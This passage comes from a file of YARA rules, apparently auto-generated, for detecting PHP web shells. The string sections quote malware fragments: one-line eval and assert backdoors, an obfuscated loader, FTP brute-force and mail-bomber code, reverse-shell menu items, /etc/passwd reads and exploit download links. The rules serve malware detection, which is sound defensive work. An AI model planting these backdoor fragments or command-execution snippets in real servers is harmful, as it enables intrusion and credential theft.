      $s5 = "wtkBPuuJ4UUlN+xf9eQHuShn5Go8Hl/Ispy9PMjIl4a8yMs3Mv2M5EwTfhXnz8XdyXI3US2k9UTv" fullword ascii
      $s6 = "t6w5i4zq09nmorYSPyaupENUXZkB4pfr5Vc1VQ/T13V6QNZyZ2VTAindn+sFjRTOd1qqWXeS5mWv" fullword ascii
      $s7 = "Q3oc0uOQHod0mNcLml9slOGjZS3kUWdBkwsyXyHzFdJfIf0V0l8h/TV+/DKSSy+jEvxuWS+jUedl" fullword ascii
      $s8 = "htrOXgrmwamvKr/Qhtqfz7AeTlsnCkpPm+aHGv6ZWRbV7Y9st/24i+Hj+RNw/tRtZp0CBhg15oe3" fullword ascii
      $s9 = "brEQSmGmQCmRKJi1lhJY4L1U8K7IP3M1irC1kaJjtNHf8Lc3NRoRdy4QMOjKzmlBAOh4dXTwPfVL" fullword ascii
      $s10 = "TWhZzyRgMk5EvK5wLisCY/fDllrywNT8MovnVjpwIWH305Z4OtoYWIJYf0vVJ0Py2yTYznp03atD" fullword ascii
      $s11 = "G3bmv2+mbXjwjn7Vx2hXu6uq916SREYeEY4jMx3hOAPMKsQRHZm8wOCMwww5mjCHEw6zS4SSmgpg" fullword ascii
      $s12 = "Tyw2GITw+bzZSh2Wcv/+IISYOKIRCJnWTvEi4sfdwVjpa3GxUfkduxG8XWsWhRpjnNQwmrgSg8Ru" fullword ascii
      $s13 = "4nkwOLiigYirCwJdV4E4DRGeOUy6tN9eU9U3er+3cXY2grbdwxF+hcrmzh90zuC0dwaH16YnpO+b" fullword ascii
      $s14 = "IzTJ7NVZqTTj3YxYZNuzkbiFIrCIvMsZ1tJ7W4Jt3gOddxZzaOHCqqVQUqxGDIkcFBpdEtlHZZYQ" fullword ascii
      $s15 = "1SfGetjm9Rs61adGKqMer090UWgN5SYDXr/E6tNqOGzy+rcNqk8LqzJc8PpENyXP2m/y+lWq36em" fullword ascii
      $s16 = "eoVIno63gzqBnbWgQlRXUanUbNRunuRGo5Ld+ZNG7sdKQZfBDXN4GX6U8Hsg/L/nQfQP9CH6phfR" fullword ascii
      $s17 = "dBCxk6T3oAPM/Q1coMQqRB76BqxXeoFETgR+Ho2O9QYWHWsVElmcICCtWfpUn2s/jwJsTW/ggK/M" fullword ascii
      $s18 = "srZ+Okf3Je78zcs3L/GXRAY3dWf+ZPLZQk/+jmOtIP75ItdvL+SKww+Z/prp11GUYPKBzPXbINI1" fullword ascii
      $s19 = "dm2XdDajQqWzx3b2cz/lvNnJAI4gAeuW81LL6Vk/de45OtmPBF6e8LyKYjTZywMP32uQLl9iwFyz" fullword ascii
      $s20 = "yRXFAqZLeJVGgqHXzRk+nYAcgRkCuEg0coD/pBKRUNNzqhCMbbd2z1x9shv1Qu2ceI/OmGGwJ7KS" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_1dc03138e5406f8e1f850181e92084ed0f4b5302
{
   meta:
      description = "php17 - file 1dc03138e5406f8e1f850181e92084ed0f4b5302.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - su" fullword ascii
      $x2 = "if(@ftp_login($connection,$_POST['ftp_login'],$user)) { echo \"[+] \".$_POST['ftp_login'].\":$user - success\\r\\n\"; $suc++; }" fullword ascii
      $x3 = "'find *dump* files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'find / -type f -name \"*dump*\" >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x4 = "else if ($file=readzlib($_POST['loc_file'])) { $filedump = $file; } else { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $x5 = "else if ($file=readzlib($_POST['e_name'])) { $filedump = $file; $only_read = 1; } else { err(1,$_POST['e_name']); $_POST['cmd']" fullword ascii
      $x6 = "else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $x7 = "'locate dump files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate dump >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x8 = "if (@pcntl_wifexited($status)){$res .= '[+] Done! Command \"'.$cfe.'\" successfully executed.';}" fullword ascii
      $x9 = "'locate error.log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate error.log >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x10 = "'locate error_log files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate error_log >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x11 = "if($file=@fopen($_POST['loc_file'],\"r\")){ $filedump = @fread($file,@filesize($_POST['loc_file'])); @fclose($file); }" fullword ascii
      $x12 = "'eng_text124'=>'Test bypass open_basedir, add data to file via error_log[php://] (PHP <= 5.1.4, 4.4.2)'," fullword ascii
      $x13 = "if($file=@fopen($_POST['e_name'],\"r\")) { $filedump = @fread($file,@filesize($_POST['e_name'])); @fclose($file); }" fullword ascii
      $x14 = "if($file=@fopen($_POST['d_name'],\"r\")){ $filedump = @fread($file,@filesize($_POST['d_name'])); @fclose($file); }" fullword ascii
      $x15 = "ox','dif id=dif',0,'1').in('text','dif_name',17,(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"))));" fullword ascii
      $x16 = "OST['test13_file2'])?($_POST['test13_file2']):($dir.\"/shell.php\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test13'));" fullword ascii
      $x17 = "OST['test15_file2'])?($_POST['test15_file2']):($dir.\"/shell.php\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test15'));" fullword ascii
      $x18 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').in('hidden','dir',0,$dir));" fullword ascii
      $x19 = "'locate proftpd.conf files >> /tmp/grep.txt;cat /tmp/grep.txt'=>'locate proftpd.conf >> /tmp/grep.txt;cat /tmp/grep.txt'," fullword ascii
      $x20 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"mail_bomber\" && !empty($_POST['mail_flood']) && !empty($_POST['mail_size']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*)
}

rule sig_019d385eb67632a7e958e23f24bd07d7
{
   meta:
      description = "php17 - file 019d385eb67632a7e958e23f24bd07d7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "13676f421b8117d66d5b38ca7999556675a5b2418445e32cc2c43278cbd1eae0"
   strings:
      $s1 = "assert($_GET['c']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_63187568f13bf233f781f008c528b0e160650211
{
   meta:
      description = "php17 - file 63187568f13bf233f781f008c528b0e160650211.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2a5f0fc4984d08fa9e8c3c5ccda1b09438d6bd04a7f962844088a6c45e248d71"
   strings:
      $x1 = "if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x2 = "function ctftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x3 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii
      $x4 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x5 = "else {$file = \"/tmp/dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x6 = "CTT Shell -=[ <?php echo $HTTP_HOST; ?> ]=- </title>" fullword ascii
      $x7 = "if (file_get_contents($v)) {echo \"<b><font color=\\\"red\\\">You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s8 = "sql_passwd).\"&sql_server=\".htmlspecialchars($sql_server).\"&sql_port=\".htmlspecialchars($sql_port).\"&sql_act=processes\");" fullword ascii
      $s9 = "# MySQL version: (\".mysql_get_server_info().\") running on \".$SERVER_ADDR.\" (\".$SERVER_NAME.\")\".\"" fullword ascii
      $s10 = "$out = \"# Dumped by ctShell.SQL v. \".$cv.\"" fullword ascii
      $s11 = "if (eregi(\"%%%filedata%%%\",$data)) {$data = str_replace(\"%%%filedata%%%\",file_get_contents($v),$data);}" fullword ascii
      $s12 = "header(\"Content-disposition: attachment; filename=\\\"\".$f.\".txt\\\";\"); " fullword ascii
      $s13 = "$acts = array(\"\",\"newdb\",\"serverstat\",\"servervars\",\"processes\",\"getfile\");" fullword ascii
      $s14 = "echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login " ascii
      $s15 = "else {echo \"<br><a href=\\\"\".$sul.\"act=lsa&nixpasswd=1&d=\".$ud.\"\\\"><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
      $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s17 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$sul.\"act=f&f=accoun" ascii
      $s18 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=\\\"green\\\"><a href=\\\"\".$sul.\"act=f&f=accoun" ascii
      $s19 = "else {echo \"ERROR. Can't send signal \".htmlspecialchars($sig).\", to process #\".htmlspecialchars($pid).\".\";}" fullword ascii
      $s20 = "$aliases[] = array(\"find config* files in current dir\", \"find . -type f -name \\\"config*\\\"\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_3935b030d8105d7b5889ca75859684716cf96d18
{
   meta:
      description = "php17 - file 3935b030d8105d7b5889ca75859684716cf96d18.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ad03a93d0572549e7beaf72491a13b00bf9198b8f8474d93449a6f9b30c5dc52"
   strings:
      $s1 = "echo $_REQUEST['pass'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0176daec986b02f26a9ac8cce7c812ace1ea4af5
{
   meta:
      description = "php17 - file 0176daec986b02f26a9ac8cce7c812ace1ea4af5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "85eec8f0c723e559bdd50e33079be2c6f4b0133e95a5766f604e938b7e8539bc"
   strings:
      $s1 = "<?php $c='ass'.'ert';$c($_POST[4]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_79b4102985370f66600af24d529ceac278106845
{
   meta:
      description = "php17 - file 79b4102985370f66600af24d529ceac278106845.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8433dcfcf3d911ea2f947298754d58102b60ad9b47caa60c88f96441fbdcba86"
   strings:
      $x1 = "$uakey = \"b5c3d0b28619de70bf5588505f4061f2\"; // MD5 encoded user-agent" fullword ascii
      $x2 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill" fullword ascii
      $x3 = "$act = array('cmd'=>'Command Execute','files'=>'File View','phpinfo'=>'PHP info', 'phpexec'=>'PHP Execute'," fullword ascii
      $x4 = "if(exec(\"wget $file -b -O $updir/$filex\")){die(\"File has been uploaded.\");}" fullword ascii
      $x5 = "req = urllib2.Request('http://www.seologs.com/ip-domains.html', urllib.urlencode({'domainname' : sys.argv[1]}))" fullword ascii
      $x6 = "$sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']" fullword ascii
      $x7 = "$pass = \"47e331d2b8d07465515c50cb0fad1e5a\"; // MD5 encoded Password" fullword ascii
      $s8 = "\"raptor - Linux <= 2.6.17.4\"=>\"http://someshit.net/files/xpl/raptor\"," fullword ascii
      $s9 = "unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);" fullword ascii
      $s10 = "'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id'," fullword ascii
      $s11 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill'=" ascii
      $s12 = "$IP = array(\"127.0.0.2\",\"127.0.0.1\"); // IP Addresses allowed to access shell" fullword ascii
      $s13 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_pas" fullword ascii
      $s14 = "\"rootbsd - BSD v?\"=>\"http://someshit.net/files/xpl/rootbsd\"," fullword ascii
      $s15 = "$user  = \"af1035a85447f5aa9d21570d884b723a\"; // MD5 encoded User" fullword ascii
      $s16 = "function cmd(){ // Command execution function" fullword ascii
      $s17 = "\"Basic Perl bindshell\"=>\"http://packetstormsecurity.org/groups/synnergy/bindshell-unix\"," fullword ascii
      $s18 = "<title>g00nshell v\" . $version . \" - \" . $servip . \"</title>\\n" fullword ascii
      $s19 = "\"h00lyshit - Linux 2.6 ALL\"=>\"http://someshit.net/files/xpl/h00lyshit\"," fullword ascii
      $s20 = "$result = mysql_query(\"SELECT * FROM \" . $_GET['table'], $sqlcon) or die(mysql_error());" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule sig_0070d23b06b1486a538c0eaa45dd167a
{
   meta:
      description = "php17 - file 0070d23b06b1486a538c0eaa45dd167a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3177334ae8eb2317c5e0775b05a002a43360a76dea4d068d35f9c271c1499408"
   strings:
      $s1 = "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\">" fullword ascii
      $s2 = "<a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">Security Angel</a> " fullword ascii
      $s3 = "<a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">www.4ngel.net</a> " fullword ascii
      $s4 = "angel [<a href=\\\"http://www.bugkidz.org\\\" target=\\\"_blank\\\">BST</a>] " fullword ascii
      $s5 = "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";" fullword ascii
      $s6 = "echo \"  <td style=\\\"padding-left: 5px;\\\"><a href=\\\"$filepath\\\" target=\\\"_blank\\\">$file</a></td>\\n\";" fullword ascii
      $s7 = "<option value=\"shell_exec\" <? if ($execfunc==\"shell_exec\") { echo \"selected\"; } ?>>shell_exec</option>" fullword ascii
      $s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; } ?>>passthru</option>" fullword ascii
      $s9 = "$shellmode=(!get_cfg_var(\"safe_mode\")) ? \" | <a href=\\\"?action=shell\\\">WebShell</a>\" : \"\";" fullword ascii
      $s10 = "</a><?=$phpinfo?><?=$shellmode?> | <a href=\"?action=sql\">SQL Query</a> | <a href=\"http://www.4ngel.net\" target=\"_blank\" ti" ascii
      $s11 = "<option value=\"system\" <? if ($execfunc==\"system\") { echo \"selected\"; } ?>>system</option>" fullword ascii
      $s12 = "<option value=\"exec\" <? if ($execfunc==\"exec\") { echo \"selected\"; } ?>>exec</option>" fullword ascii
      $s13 = "<option value=\"popen\" <? if ($execfunc==\"popen\") { echo \"selected\"; } ?>>popen</option>" fullword ascii
      $s14 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadmyfile']['name'].\"\") ? \"" fullword ascii
      $s15 = "if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {" fullword ascii
      $s16 = "<form action=\"?action=shell&dir=<?=urlencode($dir)?>\" method=\"POST\">" fullword ascii
      $s17 = "header('Content-Description: PHP Generated Data');" fullword ascii
      $s18 = "<td align=\"center\"><textarea name=\"filecontent\" cols=\"100\" rows=\"20\"><?=$contents?></textarea></td>" fullword ascii
      $s19 = "echo \"<meta http-equiv=\\\"refresh\\\" content=\\\"3;URL=\".$self.\"\\\">\";" fullword ascii
      $s20 = "<input type=\"submit\" name=\"login\" value=\"OK\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule sig_8130c96762ecd81d5ee55e8759ab7135c8a090d8
{
   meta:
      description = "php17 - file 8130c96762ecd81d5ee55e8759ab7135c8a090d8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bcec5831089072c6af2e89a539f6ddf144845a36ac11b96b0bf97f1c591b9c64"
   strings:
      $x1 = "<span style=\"color:#08C;\">'.($this->getFixedFormat($util->fixFormat($util->execute('df -h')),5,50)).'</span>" fullword ascii
      $x2 = "<span style=\"color:#08C;\">'.($this->getFixedFormat($util->fixFormat($util->execute('df -h')),5,50)).'" fullword ascii
      $x3 = "<span style=\"color:#08C; \">'.($this->getFixedFormat($util->fixFormat($util->execute('ps aux')),10,20)).'</span><br><br>" fullword ascii
      $x4 = "$body.=$this->getFixedFormat($util->execute(\"ls -lhA \".$full_dir),$full_dir);" fullword ascii
      $x5 = "<li><a href=\"#\" onclick=\"doFormPost(\\'php\\',\\'execute\\',\\'cat /etc/passwd\\');\">cat /etc/passwd</a></li>" fullword ascii
      $x6 = "<span style=\"color:#08C; \">'.($this->getFixedFormat($util->fixFormat($util->execute('ps aux')),10,20)" fullword ascii
      $x7 = "if($_SESSION['logged'] != TRUE && $_POST['cmd']!='login' && empty($_POST['pass']))" fullword ascii
      $x8 = "<li><a href=\"#\" onclick=\"doFormPost(\\'php\\',\\'execute\\',\\'uname -a\\');\">uname -a</a></li>" fullword ascii
      $x9 = "<li><a href=\"#\" onclick=\"doFormPost(\\'php\\',\\'execute\\',\\'cat /etc/passwd\\');\">cat /etc/passwd</a" fullword ascii
      $x10 = "<li><a href=\"#\" onclick=\"doFormPost(\\'mysql\\',\\'query\\',\\'show full processlist\\');\">Show Process</a></li>" fullword ascii
      $x11 = "Uname -a:<br><span style=\"color:#08C;\">'.(implode('',$util->execute('uname -a'))).'</span><br><br>" fullword ascii
      $x12 = "<li><a href=\"#\" onclick=\"doFormPost(\\'php\\',\\'execute\\',\\'df -h\\');\">df -h</a></li>" fullword ascii
      $x13 = "<li><a href=\"#\" onclick=\"doFormPost(\\'mysql\\',\\'query\\',\\'show full processlist\\');\">Show Process" fullword ascii
      $x14 = "$path.='<a href=\"#\" onclick=\"doFormPost(\\'browser\\',\\'execute\\',\\''.substr($dir,0,strpos($dir,$dirs[$i])+str" fullword ascii
      $s15 = "<li><a href=\"#\" onclick=\"doFormPost(\\'php\\',\\'execute\\',\\'find '.$util->dirBack($_SERVER['PHP_SEL" fullword ascii
      $s16 = "$path.='<a href=\"#\" onclick=\"doFormPost(\\'browser\\',\\'execute\\',\\''.$dir.'\\');\">'.$dir.'</a>';" fullword ascii
      $s17 = "tps://twitter.com/#!/codersoul' target='_blank'>@codersoul</a></div>" fullword ascii
      $s18 = "<script src='http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/js/bootstrap.min.js'></script>" fullword ascii
      $s19 = "<link href='http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css' rel='stylesheet'>" fullword ascii
      $s20 = "<li><a href='#' onClick='doFormPost(\\\"reverse\\\");'><i class='icon-resize-vertical'></i> Reverse Shell</a></li>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and all of them
}

rule sig_06138bc5af6023646ede0e1f7c1eac75
{
   meta:
      description = "php17 - file 06138bc5af6023646ede0e1f7c1eac75.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5de705eec2460c614edf09cf700176ae09ca862cd8233535b70f2c9d7307a8e0"
   strings:
      $s1 = "lk9UiLvl/sjTbD7wXIRC+oEFyzzAPKttv8ex7ilFNlJ+nMwEnK7+QsBL6k5fE3WDBMC4xLoF8Hs/kZp6" fullword ascii
      $s2 = "WxJ4QZ4FjXPnf/qoJQZiVRO6tWblhC7ju1T5oiHud08BIcQ799DNhIfX+iaxqDLLJO5gS3Qvl+gQmJHj" fullword ascii
      $s3 = "EMSYShVyEyezJGqO68mLal3NGdXZNa/fBmPvsaCV32AJNVph6n5jcf8/eyw73BkgvXg0DEXpjtlI1QGC" fullword ascii
      $s4 = "0mdgx8xngHqGlOEReZ8PvvpIb/izKnJ8Wc2hOIRcE2IBX+g+Js3TZn19io5z7CKJXHkWnkQ5+hoSFQkn" fullword ascii
      $s5 = "XlOGgoIqGVWVayZvjHbCNDR0/Qw4aZ+IBUEdCJv3mVHnHQ5dTqq2gG5FhzcZFxYx6iovWcziGpfnZ+aI" fullword ascii
      $s6 = "qAhvcjBwy2HHxB+EPFT/1MoFdrVQYhkQLUQmgqaxI4IrCJlReuxEZ44MQG4YNWgxmwG5So1oPbhm2Y7V" fullword ascii
      $s7 = "tmPq4QZaWvYa+fm1Gspsf10U1MlPBzPw+rfGQbwXpaZRoxC5XQHr2dI9nzWaDClQAztdcW8x0qPrgX6Z" fullword ascii
      $s8 = "E0Rkb6HYBwqkjTYNK6PAssAaNPuSsPKFNTpWF0GeJufqYhqIWVjF6sP4J1XASgJJTwgaJ7nyQ/0Lw7qk" fullword ascii
      $s9 = "qTCyk0G40SU248g5hujQcu597SReAdIh/RRD0fH4gj5p0jeTg4vZ874Lkw/5GiXf3mmMTZBYPr50kGXf" fullword ascii
      $s10 = "Us5yUAXf6bvMQTIhofPC//yQCBKZ/fW2lf8O6O5fDjAEiQqYlzxto9r2EEoMq6YlKAfT75klCB7SD3Ge" fullword ascii
      $s11 = "0iBJhBZBZTjqJE2o+wbMybZMjz20+FiNCfZrWclVEaQvCVEL5jkxO30ON/8SrPtvf3jWMmJi0ap//Og2" fullword ascii
      $s12 = "PwY6FAhCpW9PvkzZdRGCVG0Wd1JhFMZh0TASeGL+CS9JjHrRX//DXcu84FBs8AwmrAD6zdyQIsHO4ww5" fullword ascii
      $s13 = "kYuO4OED3u1MgkT7WM0h0+GHKiqi7vTf//oZCPYOiIIp+Iz3+hSF90da9t5ht4LhEe0+hOiK2M4E3tDG" fullword ascii
      $s14 = "();}} @header(\"Status: 404 Not Found\"); ?>" fullword ascii
      $s15 = "4AWKuOHY4GEdY0J/VZi/R/hRZzC5AFFfRfoUwZiRiO4UZu8ZhdixI/7Tm+67qa1eqwqTQHXYHnlEiHLs" fullword ascii
      $s16 = "uglw3QnYHbp7Xnxp/8/ry+S2mJN3v6uz2cbmoAHrXwCCzAWo9pR7sS5IYmuMIND/6zaFGLjiKIbklweK" fullword ascii
      $s17 = "H3mxMEPS60YD3Vg3Zs4rrtGdd5POVw79m3KB8FG5eD7XamQR4P3kBdSKD9d/d/CHL68QmizjNI1vx72U" fullword ascii
      $s18 = "YHWFZ1zuQSh8xOHRvuZ7LhSG+mlgPSsKsjxnvLvQ/ysFRv7b2tc/E3o+3bM2yW2xGNIJzOwMUunO05/p" fullword ascii
      $s19 = "sfOOsOG98wwQHjDzenbkrXAoARpgS0X60W7ZbM1mLpBfVTIEjAm7F6MQgbBoibZNNiIn8YVTweJsSq/e" fullword ascii
      $s20 = "W/Kl4OcQLiHOellZjW053O7ynqJk6rp2htYA/eIcY+hd51UK62S/1yDmtiVLhnYz+dWK35GhCdX24K6P" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule sig_2017_10_05_204617_create_spool_table
{
   meta:
      description = "php17 - file 2017_10_05_204617_create_spool_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3e74687761777a6c75d27bb41845805c0407cc8e199884b733b35e235e65afaf"
   strings:
      $s1 = "$table->longText('payload');" fullword ascii
      $s2 = "$table->tinyInteger('attempts')->unsigned();" fullword ascii
      $s3 = "Schema::create('spool', function (Blueprint $table)" fullword ascii
      $s4 = "$table->unsignedInteger('reserved_at')->nullable();" fullword ascii
      $s5 = "$table->tinyInteger('reserved')->unsigned();" fullword ascii
      $s6 = "use Nova\\Database\\Migrations\\Migration;" fullword ascii
      $s7 = "Schema::dropIfExists('spool');" fullword ascii
      $s8 = "use Nova\\Database\\Schema\\Blueprint;" fullword ascii
      $s9 = "$table->unsignedInteger('created_at');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule a916cb74c6fd7228bc90a93106f7b9e2120d7117
{
   meta:
      description = "php17 - file a916cb74c6fd7228bc90a93106f7b9e2120d7117.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "985afb105b564c1a6b0e4f05738999f6a92b9035caa4c7eebbff2db67238459d"
   strings:
      $s1 = "$d=',0,$e))8g)8g,$k)8g));$o=ob_get_8g8gcontents8g()8g;o8gb8g_end_clean();$d=b8ga8gse64_e8gn';" fullword ascii
      $s2 = "$F='code(x(g8gzcomp8gress($o),$k))8g;p8g8grint(\"<$k>8g$d</$k>\");@se8gssio8gn_8gdestroy();}}}}';" fullword ascii
      $s3 = "$l='@8g$r[\"HTTP_AC8gCEPT_L8g8gANGUAGE\"];if8g($8grr&&$8gra){$u=pars8ge_u8gr8gl($8grr8g);pa8';" fullword ascii
      $s4 = "$W='g8gESSION;$8gss=\"8gsubstr\";$sl8g=\"strto8glowe8g8gr\";$i=$m[1]8g[0].$8g8gm[1][1];$h=$sl8g($ss(8gm';" fullword ascii
      $s5 = "$L='se8g64_d8gecod8ge(pr8geg_rep8glace(ar8gra8gy8g(\"/_/\",\"/-8g/\"),array8g(\"/\",\"+\")8g,$ss($s[$8gi]';" fullword ascii
      $s6 = "$p='[\\\\8g8gw-]+(?:8g;q=0.([\\\\d]8g))?8g,8g?/\",$r8ga,8g$m);if($q&&$m){@se8gssion_st8gart();8g$s=&$_S8';" fullword ascii
      $s7 = "$n='\";$p8g=$ss(8g$p,38g);8g}if(8gar8gray8g_k8gey_exists($i,$s)){$s[$i].8g=$p8g;$e=st8grpo8gs(';" fullword ascii
      $s8 = "$A='=$t{$i}^$k8g8g{$j8g};}}retur8gn $o;}$r8g=$_S8gERVER;$rr=@8g$8gr[\"HTT8gP_R8gEFERER\"];$ra=';" fullword ascii
      $s9 = "$t='$kh=\"5d8g41\";$8gkf=\"402a\";f8g8gunction x($t8g,$k){$8gc=s8gtrl8ge8gn8g($k);$l=strlen(8g$t';" fullword ascii
      $s10 = "$B='grse_str($u[\"quer8gy\"],8g$q);8g$q=array_values($8gq)8g;p8greg_match_all8g(\"/(8g[\\\\w])';" fullword ascii
      $s11 = "$m='$s[8g$8gi],$f);if($e){$8gk=$kh.$kf;8go8gb_start();8g@eva8gl(@gzunc8gompres8gs(@x(@8gba';" fullword ascii
      $s12 = "$Y=');$o=8g\"8g\";for($i=0;8g$i<$l;){fo8gr($8gj=08g;($j<$c&&$i8g8g<$l);$j++,$i8g++8g)8g{$o.';" fullword ascii
      $s13 = "$T='d5($8gi8g.$kh),0,3));$f=8g$sl8g8g($ss(md5($i.$8gkf),0,38g));$p8g=\"\"8g;fo8gr($z8g=8g1';" fullword ascii
      $s14 = "$u=';$z<count8g($m[1]);$8gz++)$p.=$q[8g$m[28g][$z]];i8g8gf(strpos(8g$p,$h)===08g){$s8g[$i]=\"';" fullword ascii
      $s15 = "$a=str_replace('8g','',$t.$Y.$A.$l.$B.$p.$W.$T.$u.$n.$m.$L.$d.$F);" fullword ascii
      $s16 = "$U=str_replace('zy','','crezyatzyezy_fuzynzyczytion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_11bb1fa3478ec16c00da2a1531906c05e9c982ea
{
   meta:
      description = "php17 - file 11bb1fa3478ec16c00da2a1531906c05e9c982ea.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fe153735566962fc27b049a353d3938ee3f6c21cbe03ee8842bc849f1b43a049"
   strings:
      $s1 = "call_user_func($_GET['dede'], base64_decode('QGV2YWwoJF9QT1NUW2JzXSk7'));" fullword ascii
      $s2 = "//call_user_func($_GET['dede'], \"@eval($_POST[bs]);\");" fullword ascii
      $s3 = "if(key($_GET)=='dede')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_8cebc549c7d0d5219a91594d64f07894
{
   meta:
      description = "php17 - file 8cebc549c7d0d5219a91594d64f07894.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6bfb204c9ef0648222dd7444044e0f85cf4f8bf900a4cd9710ba99a7c2fea7fa"
   strings:
      $s1 = "$headers .= \"X-iGspam-global: Unsure, spamicity=0.570081 - pe=5.74e-01 - pf=0.574081 - pg=0.574081\\r\\n\";" fullword ascii
      $s2 = "$headers .= \"X-Mailer: iGMail [www.ig.com.br]\\n\";" fullword ascii
      $s3 = "echo \"<font color=red>* N&#1098;mero: $count <b>\".$email[$i].\"</b> <font color=red>ERRO AO ENVIAR</font><br><hr>\";" fullword ascii
      $s4 = "<td height=\"20\" colspan=\"2\" bgcolor=\"#000000\"><span class=\"texto\">MortoLino - mode*SPAMMER!</span></td>" fullword ascii
      $s5 = "$headers .= \"Content-type: text/html; charset=iso-8859-1\\n\";" fullword ascii
